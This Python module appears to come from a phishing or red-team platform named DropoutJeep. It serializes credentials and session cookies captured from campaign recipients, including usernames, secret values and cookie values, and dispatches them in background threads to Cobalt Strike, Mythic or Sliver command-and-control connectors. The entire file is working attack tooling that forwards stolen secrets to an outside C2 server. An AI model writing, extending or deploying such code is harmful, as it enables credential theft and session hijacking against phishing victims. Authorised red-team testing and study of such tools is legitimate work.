"""C2 connector dispatcher for DropoutJeep.

When a credential or cookie is captured, active C2ConnectorConfig rows are
pushed to the configured C2 framework (Cobalt Strike, Mythic, or Sliver).
Dispatch runs in a background thread so the request path is not blocked.
"""

import json
import logging
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Any

from dropoutjeep_lib import db

from . import cobalt_strike, mythic, sliver

logger = logging.getLogger(__name__)

# Reusable background thread pool for C2 dispatches.
_dispatch_pool = ThreadPoolExecutor(max_workers=2, thread_name_prefix="c2-")

_CONNECTOR_MODULES = {
    "cobalt_strike": cobalt_strike,
    "mythic": mythic,
    "sliver": sliver,
}


def _serialize_credential(credential) -> dict:
    """Build a JSON-safe payload from a CapturedCredential instance."""
    return {
        "campaign_id": credential.campaign_id,
        "recipient_id": credential.recipient_id,
        "credential_type": credential.credential_type,
        "field_name": credential.field_name,
        "username": credential.username,
        "value": credential.get_value(),
        "source_path": credential.source_path,
        "captured_at": credential.captured_at.isoformat() if credential.captured_at else None,
    }


def _serialize_cookie(cookie) -> dict:
    """Build a JSON-safe payload from a CapturedCookie instance."""
    return {
        "campaign_id": cookie.campaign_id,
        "recipient_token": cookie.recipient_token,
        "cookie_name": cookie.cookie_name,
        "cookie_value": cookie.cookie_value,
        "cookie_domain": cookie.cookie_domain,
        "cookie_path": cookie.cookie_path,
        "source": cookie.source,
        "captured_at": cookie.captured_at.isoformat() if cookie.captured_at else None,
    }


def push_credential(credential_or_payload: Any, connector_config) -> None:
    """Dispatch a captured credential (or serialized payload) to one connector."""
    module = _CONNECTOR_MODULES.get(connector_config.type)
    if module is None:
        logger.warning("Unknown C2 connector type: %s", connector_config.type)
        return

    if isinstance(credential_or_payload, dict):
        payload = credential_or_payload
    else:
        payload = _serialize_credential(credential_or_payload)

    config = connector_config.get_config()
    try:
        module.push_credential(payload, config)
    except Exception:
        logger.exception("C2 credential push failed for connector %s", connector_config.name)


def push_cookie(cookie_or_payload: Any, connector_config) -> None:
    """Dispatch a captured cookie (or serialized payload) to one connector."""
    module = _CONNECTOR_MODULES.get(connector_config.type)
    if module is None:
        logger.warning("Unknown C2 connector type: %s", connector_config.type)
        return

    if isinstance(cookie_or_payload, dict):
        payload = cookie_or_payload
    else:
        payload = _serialize_cookie(cookie_or_payload)

    config = connector_config.get_config()
    try:
        module.push_cookie(payload, config)
    except Exception:
        logger.exception("C2 cookie push failed for connector %s", connector_config.name)


def _dispatch_single(payload: dict, app, is_cookie: bool) -> None:
    """Load active C2 connectors and push the payload to each one.

    Runs inside a worker thread so the after_insert listener never performs
    ORM queries on the request-scoped session.
    """
    from dropoutjeep_lib.models import C2ConnectorConfig

    with app.app_context():
        connectors = C2ConnectorConfig.query.filter_by(is_active=True).all()
        for conn in connectors:
            try:
                if is_cookie:
                    push_cookie(payload, conn)
                else:
                    push_credential(payload, conn)
            except Exception:
                logger.exception("C2 dispatch failed for connector %s", conn.name)

        try:
            db.session.commit()
        except Exception:
            pass


def dispatch_credential(credential, app) -> None:
    """Queue C2 dispatches for a newly created credential.

    Called from the SQLAlchemy after_insert listener with a detached credential
    instance. We capture the payload synchronously and hand it off to a worker.
    """
    payload = _serialize_credential(credential)
    _dispatch_pool.submit(_dispatch_single, payload, app, False)


def dispatch_cookie(cookie, app) -> None:
    """Queue C2 dispatches for a newly created cookie."""
    payload = _serialize_cookie(cookie)
    _dispatch_pool.submit(_dispatch_single, payload, app, True)
